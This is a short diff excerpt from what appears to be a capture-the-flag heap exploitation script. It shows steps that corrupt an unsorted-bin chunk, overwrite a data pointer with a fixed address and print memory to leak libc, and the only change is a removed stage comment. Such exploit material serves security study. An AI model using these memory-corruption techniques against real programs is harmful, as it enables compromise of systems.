@@ -164,7 +164,6 @@ edit(3, 0x90, payload)
 
 delete(4)								#free(4) but 3 in unsoftedbin because of payload made the prog think the 3 th is unsortedbin
 
-#### stage3: leak libc ###########################################################
 edit(3, 0x8, p64(0x602020))				#now all we edit chunk(3) is edit(0x6020e0). 0x6020e0 is the address of all chunk's data address
 show(0)
 p.recvuntil(b"Data = ")
